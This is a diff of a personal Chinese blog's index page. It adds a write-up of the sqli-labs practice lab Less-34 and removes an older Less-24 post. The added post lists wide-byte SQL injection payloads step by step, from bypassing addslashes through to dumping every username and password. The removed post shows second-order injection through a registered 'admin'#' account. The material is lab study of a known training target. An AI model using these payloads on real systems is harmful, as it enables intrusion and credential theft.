@@ -64,6 +64,47 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-34" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/20/sql-labs-Less-34/" class="article-date">
+  <time datetime="2021-02-20T11:56:21.000Z" itemprop="datePublished">2021-02-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/20/sql-labs-Less-34/">sql-labs-Less-34</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>方法一：<br>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-34/%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-34/，打开http</a> header live,输入admin：admin登录；<br>打开最上面的那一个:</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-34/1.png" alt="1"><br>从源代码可以看到umane和passwd都被套上了addslashes函数，所以我们可以用宽字节注入。<br>因为在页面直接注入会被url转码，所以我们在http header live进行注入。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-34/2.png" alt="2"><br>然后跳出一个新页面。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-34/3.png" alt="3"><br>判断字符：<br>第一步：uname=admin%df’&amp;passwd=admin&amp;submit=Submit（报错）<br>第二步：uname=admin%df’#&amp;passwd=admin&amp;submit=Submit（不报错）<br>查列数：uname=admin%df’ order by 2#&amp;passwd=admin&amp;submit=Submit<br>测位置：uname=admin%df’ union select 1,2#&amp;passwd=admin&amp;submit=Submit<br>爆库：uname=admin%df’ union select database(),2#&amp;passwd=admin&amp;submit=Submit<br>爆表：uname=admin%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),2#&amp;passwd=admin&amp;submit=Submit<br>爆列：uname=admin%df’ union select (select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),2#&amp;passwd=admin&amp;submit=Submit<br>爆字段：uname=admin%df’ union select (select group_concat(username) from users),(select group_concat(password) from users)#&amp;passwd=admin&amp;submit=Submit</p>
+<p>方法二：<br>将utf-8转换为utf-16或utf-32，例如将’转为utf-16的�’。接下来都是在username改，password不管随便输。<br>判断字符：�’（报错）�’#（不报错）<br>列数：�’ order by 2#<br>测位置：�’union select 1,2#<br>爆库：�’union select database(),2#<br>爆表：�’union select (select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),2#<br>爆列：�’union select (select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),2#<br>爆字段：�’union select (select group_concat(username) from users),(select group_concat(password) from users)#</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/20/sql-labs-Less-34/" data-id="ckle0pxbg00001kuxdbvj8kxk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-32~33" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/20/sql-labs-Less-32~33/" class="article-date">
@@ -473,49 +514,6 @@ and >> &&    or >> ||(既Less-25的方法二)   like可以替换 =    <> 等价�
 
 
   
-    <article id="post-sql-labs-Less-24" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/14/sql-labs-Less-24/" class="article-date">
-  <time datetime="2021-02-14T06:11:13.000Z" itemprop="datePublished">2021-02-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-24/">http://127.0.0.1/sql/Less-24/</a></p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/1.png" alt="1"><br>注册一个新账号：admin’#,密码：123</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/2.png" alt="2"><br>再登录，然后把密码改成123456,改好后再用admin，123456登录。</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/3.png" alt="3"><br>登陆成功。<br>查看数据库：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/4.png" alt="4"></p>
-<h2>小结</h2>
-https://www.jianshu.com/p/3fe7904683ac
-https://www.cnblogs.com/cute-puli/p/11145758.html
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/14/sql-labs-Less-24/" data-id="ckl54fzm40000o8uxewbqa1dx" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -552,6 +550,10 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
       <ul>
         
           <li>
+            <a href="/2021/02/20/sql-labs-Less-34/">sql-labs-Less-34</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/20/sql-labs-Less-32~33/">sql-labs-Less-32~33</a>
           </li>
         
@@ -565,10 +567,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
         
           <li>
             <a href="/2021/02/17/sql-labs-Less-27a/">sql-labs-Less-27a</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/17/sql-labs-Less-27/">sql-labs-Less-27</a>
           </li>
         
       </ul>
